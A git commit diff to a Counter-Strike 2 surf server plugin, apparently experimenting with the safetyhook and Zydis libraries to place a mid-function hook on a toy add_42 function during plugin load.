75ace3a98cd4a2fa8e54515400aa51c4dbee8ebb
Ciallo <dison2233@126.com>
2025-09-02 19:01:28 +0800

    why failed

--- src/cs2surf.cpp
+++ src/cs2surf.cpp
@@ -20,6 +20,7 @@
 #include <vendor/MultiAddonManager/public/imultiaddonmanager.h>
 
 #include <safetyhook.hpp>
+#include <Zydis/Zydis.h>
 
 IMultiAddonManager* g_pMultiAddonManager;
 
@@ -31,9 +32,18 @@ CSurfPlugin* SurfPlugin() {
 	return &g_SurfPlugin;
 }
 
-SafetyHookInline g_HkSurfPlugin{};
+SafetyHookInline g_HkSurfPlugin {};
+
 CSurfPlugin* HkSurfPlugin() {
 	return g_HkSurfPlugin.call<CSurfPlugin*>();
+}
+
+SAFETYHOOK_NOINLINE int add_42(int a) {
+	return a + 42;
+}
+
+void hooked_add_42(SafetyHookContext& ctx) {
+	ctx.rax = 1337;
 }
 
 bool CSurfPlugin::Load(PluginId id, ISmmAPI* ismm, char* error, size_t maxlen, bool late) {
@@ -53,6 +63,26 @@ bool CSurfPlugin::Load(PluginId id, ISmmAPI* ismm, char* error, size_t maxlen, b
 	g_SMAPI->AddListener(this, this);
 
 	g_HkSurfPlugin = safetyhook::create_inline(SurfPlugin, HkSurfPlugin);
+
+	ZydisDecoder decoder {};
+	ZydisDecoderInit(&decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);
+
+	auto ip = reinterpret_cast<uint8_t*>(add_42);
+
+	while (*ip != 0xC3) {
+		ZydisDecodedInstruction ix {};
+
+		ZydisDecoderDecodeInstruction(&decoder, nullptr, reinterpret_cast<void*>(ip), 15, &ix);
+
+		// Follow JMPs
+		if (ix.opcode == 0xE9) {
+			ip += ix.length + (int32_t)ix.raw.imm[0].value.s;
+		} else {
+			ip += ix.length;
+		}
+	}
+
+	auto hHook = safetyhook::create_mid(ip, hooked_add_42);
 
 	ADMIN::AddAdmin(76561198083290027, AdminFlag::Root);
 
